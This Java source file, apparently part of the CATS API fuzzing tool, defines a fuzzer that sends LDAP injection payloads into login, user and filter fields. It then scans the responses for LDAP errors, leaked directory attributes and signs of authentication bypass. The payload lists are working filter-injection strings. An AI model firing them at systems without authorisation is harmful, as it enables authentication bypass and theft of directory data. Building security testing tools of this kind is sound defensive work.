package com.endava.cats.fuzzer.fields;

import com.endava.cats.annotations.FieldFuzzer;
import com.endava.cats.args.SecurityFuzzerArguments;
import com.endava.cats.fuzzer.executor.SimpleExecutor;
import com.endava.cats.fuzzer.fields.base.BaseSecurityInjectionFuzzer;
import com.endava.cats.model.CatsResponse;
import com.endava.cats.model.FuzzingData;
import com.endava.cats.report.TestCaseListener;
import jakarta.inject.Singleton;

import java.util.List;
import java.util.Locale;

/**
 * Fuzzer that sends LDAP injection payloads in string fields.
 * LDAP injection can lead to authentication bypass, unauthorized data access,
 * and privilege escalation in applications using LDAP for authentication/authorization.
 */
@Singleton
@FieldFuzzer
public class LdapInjectionInStringFieldsFuzzer extends BaseSecurityInjectionFuzzer {
    private static final List<String> FIELDS = List.of("user", "name", "login", "username", "email", "mail", "dn", "cn", "uid", "filter",
            "search", "query", "account", "member", "group", "ou", "organization", "dept", "department");

    private static final List<String> TOP_PAYLOADS = List.of(
            "*)(&",
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*))",
            "*)|(objectClass=*",
            "admin#",
            "admin%00",
            "LDAP_TEST_8051*",
            "LDAP_TEST_6497)"
    );

    private static final List<String> ALL_PAYLOADS = List.of(
            "*)(uid=*",
            "*)(&",
            "*))(&(uid=*",
            "*)(uid=*))(|(uid=*",
            "admin",
            "admin*",
            "admin*)(uid=*",
            "admin)(&)",
            "admin)(&(password=*))",
            "administrator*",
            "*)(objectClass=*",
            "*)|(objectClass=*",
            "*))%00",
            "*)(&(objectClass=*",
            "*)(cn=*",
            "*)(mail=*",
            ")(cn=*",
            ")(&(objectClass=*",
            "))(&(uid=*",
            "cn=*",
            "uid=*",
            "sn=*",
            "givenName=*",
            "mail=*",
            "userPassword=*",
            "objectClass=*",
            "distinguishedName=*",
            "memberOf=*",
            "LDAP_MARKER_8051*",
            "*)(&(cn=LDAP_TEST_8051",
            "LDAP_MARKER_6497*",
            "*)(&(cn=LDAP_FAIL_6497",
            "(&(objectClass=*)(uid=*))",
            "(|(uid=*)(cn=*))",
            "(&(|(uid=*)(cn=*))(objectClass=*))",
            ":=*",
            ":dn:=*",
            "cn:1.2.840.113556.1.4.803:=*",
            "\\2a",
            "\\28",
            "\\29",
            "\\2a)(uid=\\2a",
            "admin%00",
            "admin\u0000",
            "*%00",
            "admin#",
            "admin//",
            "admin--",
            "*)#",
            "*)(objectClass=*)(objectClass=*)(objectClass=*)(objectClass=*",
            "!(cn=*)",
            "!(uid=nonexistent)",
            "!(&(uid=*))",
            "&(objectClass=*)",
            "|(objectClass=*)",
            "*)(&(uid=*)(userPassword=*",
            "*)(&(cn=a*",
            "ZZZZZ_NONEXISTENT_8051*",
            "count=1)(|",
            "*)(count=9999",
            "sAMAccountName=*",
            "distinguishedName=*",
            "objectCategory=*",
            "primaryGroupID=*",
            "adminCount=1",
            "userAccountControl:1.2.840.113556.1.4.803:=512"
    );

    private static final List<String> LDAP_ERROR_KEYWORDS = List.of(
            // Java LDAP
            "javax.naming.namingexception",
            "javax.naming.namenotfoundexception",
            "javax.naming.communicationexception",
            "javax.naming.authenticationexception",
            "javax.naming.partialresultexception",
            "javax.naming.sizelimitexceededexception",
            "javax.naming.invalidnameexception",
            "javax.naming.directory",
            "com.sun.jndi.ldap",

            // .NET LDAP
            "system.directoryservices.protocols",
            "system.directoryservices.activedirectory",
            "directoryservices.ldapexception",

            // Python LDAP
            "ldap.filter_error",
            "ldap.invalid_dn_syntax",
            "ldap.ldaperror",

            // PHP LDAP
            "ldap_bind()",
            "ldap_search()",
            "ldap_error()",

            // Filter-specific errors (strong indicators)
            "invalid search filter",
            "bad search filter",
            "malformed search filter",
            "search filter error",
            "filter parsing error",
            "invalid filter syntax",
            "unbalanced parentheses in filter",

            // DN-specific errors
            "invalid distinguished name",
            "invalid dn syntax",
            "malformed dn",

            // LDAP operation errors (specific enough)
            "ldap operations error",
            "ldap protocol error",
            "ldap size limit exceeded",
            "ldap time limit exceeded",
            "ldap strong auth required",
            "ldap unwilling to perform",
            "ldap invalid credentials",

            // Active Directory - specific error codes
            "dsid-",                    // AD error codes always start with DSID-
            "80090308",                 // Specific AD error: bad logon
            "8009030c",                 // Specific AD error: logon failure
            "80090301",                 // SEC_E_INVALID_TOKEN
            "active directory error",   // More specific than just "active directory"

            // OpenLDAP specific
            "openldap error",
            "slapd:",

            "ldap error:",
            "ldap exception:",
            "ldaperr:",
            "ldap_err_",
            "ldap code:",
            "ldap result:",
            "ldap_invalid",

            "invalid attribute syntax",
            "undefined attribute type",
            "attribute or value exists",
            "invalid attribute value",

            "ldap_operations_error",
            "ldap_protocol_error",
            "ldap_timelimit_exceeded",
            "ldap_sizelimit_exceeded",
            "ldap_auth_method_not_supported",
            "ldap_strong_auth_required",
            "ldap_partial_results",
            "ldap_adminlimit_exceeded",
            "ldap_unavailable_critical_extension",
            "ldap_confidentiality_required"
    );

    private static final List<String> LDAP_SUCCESS_INDICATORS = List.of(
            "ldap_marker_8051",
            "ldap_test_8051",
            "ldap_marker_6497",

            // Common LDAP attributes that might leak
            "distinguishedname",
            "cn=",
            "uid=",
            "ou=",
            "dc=",
            "objectclass",
            "samaccountname",
            "userpassword",
            "memberof",
            "mail=",

            // Multiple user indicators (suggests returning all users)
            "cn=admin",
            "cn=administrator",
            "uid=admin",
            "uid=root",

            // LDIF format indicators
            "dn:",
            "changetype:",
            "objectclass:"
    );

    public LdapInjectionInStringFieldsFuzzer(SimpleExecutor simpleExecutor, TestCaseListener testCaseListener, SecurityFuzzerArguments securityFuzzerArguments) {
        super(simpleExecutor, testCaseListener, securityFuzzerArguments);
    }

    @Override
    protected String getInjectionType() {
        return "LDAP";
    }

    @Override
    protected List<String> getTopInjectionPayloads() {
        return TOP_PAYLOADS;
    }

    @Override
    protected List<String> getAllInjectionPayloads() {
        return ALL_PAYLOADS;
    }

    @Override
    public String description() {
        return "iterate through each string field and send LDAP injection payloads to detect LDAP injection vulnerabilities that could lead to authentication bypass or unauthorized data access";
    }

    @Override
    protected boolean shouldFuzzField(String fieldName) {
        String lowerCaseField = fieldName.toLowerCase(Locale.ROOT);

        return FIELDS.stream().anyMatch(lowerCaseField::contains);
    }

    @Override
    protected InjectionDetectionResult detectInjectionEvidence(CatsResponse response, FuzzingData data) {
        String responseBody = response.getBody();
        String responseLower = responseBody.toLowerCase(Locale.ROOT);

        for (String keyword : LDAP_ERROR_KEYWORDS) {
            if (responseLower.contains(keyword) && appearsInErrorContext(responseBody, keyword)) {
                return InjectionDetectionResult.vulnerable(
                        "LDAP injection vulnerability detected",
                        "Response contains LDAP error message: '" + keyword + "'"
                );
            }
        }

        int successCount = 0;
        StringBuilder foundIndicators = new StringBuilder();

        for (String indicator : LDAP_SUCCESS_INDICATORS) {
            if (responseLower.contains(indicator)) {
                successCount++;
                if (!foundIndicators.isEmpty()) {
                    foundIndicators.append(", ");
                }
                foundIndicators.append(indicator);
            }
        }

        if (successCount >= 4) {
            return InjectionDetectionResult.vulnerable(
                    "Potential LDAP injection detected",
                    "Response contains multiple LDAP directory attributes (" + successCount + " indicators: " +
                            foundIndicators + "), suggesting filter injection may have returned unauthorized directory data"
            );
        }

        if (detectAuthenticationBypass(responseLower)) {
            return InjectionDetectionResult.vulnerable(
                    "Potential LDAP authentication bypass detected",
                    "Response suggests successful authentication with wildcard or injection payload"
            );
        }

        if (hasLdifStructure(responseBody)) {
            return InjectionDetectionResult.vulnerable(
                    "Potential LDAP data extraction detected",
                    "Response contains LDIF-like structure suggesting directory data dump"
            );
        }

        if (responseBody.length() > 50000 && containsMultipleUserIndicators(responseLower)) {
            return InjectionDetectionResult.vulnerable(
                    "Potential LDAP injection detected",
                    "Response is unusually large and contains multiple user-like structures, " +
                            "suggesting injection may have bypassed filters and returned all directory entries"
            );
        }

        return InjectionDetectionResult.notVulnerable();
    }

    /**
     * Checks if the keyword appears in an actual error context (not just a field name).
     * This helps reduce false positives.
     */
    private boolean appearsInErrorContext(String body, String keyword) {
        int index = body.toLowerCase(Locale.ROOT).indexOf(keyword);
        if (index == -1) {
            return false;
        }

        int start = Math.max(0, index - 50);
        int end = Math.min(body.length(), index + keyword.length() + 50);
        String context = body.substring(start, end).toLowerCase(Locale.ROOT);

        String[] errorContextWords = {
                "error", "exception", "failed", "failure", "invalid",
                "malformed", "syntax", "parsing", "unable", "cannot",
                "denied", "rejected", "fault", "warning", "stack trace",
                "at com.", "at javax.", "at org.", "caused by"
        };

        for (String errorWord : errorContextWords) {
            if (context.contains(errorWord)) {
                return true;
            }
        }

        return false;
    }

    /**
     * Checks if response has LDIF (LDAP Data Interchange Format) structure.
     * LDIF is a text format for representing LDAP directory data.
     */
    private boolean hasLdifStructure(String body) {
        String lower = body.toLowerCase(Locale.ROOT);

        boolean hasDn = lower.contains("dn:");
        boolean hasObjectClass = lower.contains("objectclass:");
        boolean hasChangeType = lower.contains("changetype:");

        int attributeCount = 0;
        String[] ldifAttributes = {"cn:", "uid:", "ou:", "dc:", "mail:", "sn:",
                "givenname:", "objectclass:", "distinguishedname:"
        };

        for (String attr : ldifAttributes) {
            if (lower.contains(attr)) {
                attributeCount++;
            }
        }

        return (hasDn && attributeCount >= 3) || (hasObjectClass && hasChangeType);
    }

    /**
     * Checks if response contains indicators of multiple user records.
     * Uses more specific patterns to avoid false positives.
     */
    private boolean containsMultipleUserIndicators(String responseLower) {
        int patterns = 0;

        patterns += countPattern(responseLower, "\"uid\":");
        patterns += countPattern(responseLower, "\"cn\":");
        patterns += countPattern(responseLower, "\"distinguishedname\":");
        patterns += countPattern(responseLower, "\"samaccountname\":");
        patterns += countPattern(responseLower, "<uid>");
        patterns += countPattern(responseLower, "<cn>");

        boolean hasArrayStructure = responseLower.contains("[{") && responseLower.contains("}]");

        return patterns > 8 || (hasArrayStructure && patterns > 4);
    }

    /**
     * Detects if the response indicates successful authentication/authorization
     * that wouldn't normally occur with the injected payload.
     */
    private boolean detectAuthenticationBypass(String responseLower) {
        String[] successIndicators = {
                "login successful",
                "authentication successful",
                "welcome",
                "logged in",
                "session created",
                "token",
                "authorized",
                "access granted"
        };

        for (String indicator : successIndicators) {
            if (responseLower.contains(indicator)) {
                return true;
            }
        }

        return false;
    }

    private int countPattern(String text, String pattern) {
        int count = 0;
        int index = 0;
        while ((index = text.indexOf(pattern, index)) != -1) {
            count++;
            index += pattern.length();
        }
        return count;
    }
}